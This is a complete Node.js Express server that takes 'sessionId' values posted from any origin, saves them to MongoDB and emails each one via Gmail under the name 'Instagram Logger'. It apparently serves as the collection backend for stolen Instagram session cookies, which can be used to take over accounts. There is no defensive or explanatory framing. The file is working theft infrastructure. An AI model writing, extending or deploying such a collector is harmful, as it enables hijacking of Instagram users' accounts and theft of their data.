require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/tracking", {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  serverSelectionTimeoutMS: 30000
})
.then(() => console.log('✅ MongoDB connected'))
.catch(err => console.error('❌ MongoDB connection error:', err));

// Session Model
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', sessionSchema);

// Email Transport with better error handling
let transporter;
try {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD
    }
  });
  console.log('✅ Email transporter initialized');
} catch (emailError) {
  console.error('❌ Email transport error:', emailError.message);
}

// API Endpoint
app.post('/api/sessions', async (req, res) => {
  try {
    const { sessionId } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }

    try {
      const newSession = await Session.create({ sessionId });
      
      // Only try to send email if transporter initialized
      if (transporter) {
        await transporter.sendMail({
          from: `"Instagram Logger" <${process.env.EMAIL_USER}>`,
          to: process.env.RECIPIENT_EMAIL,
          subject: 'New Instagram Session',
          text: `Session ID: ${sessionId}`,
          html: `<p>New session: <code>${sessionId}</code></p>`
        });
      }

      return res.json({ 
        success: true,
        message: 'Session recorded' + (transporter ? ' and email sent' : '')
      });

    } catch (dbError) {
      if (dbError.code === 11000) {
        return res.json({ success: false, message: 'Session already exists' });
      }
      throw dbError;
    }

  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Health endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'Running',
    db: mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected',
    email: transporter ? 'Configured' : 'Not configured'
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});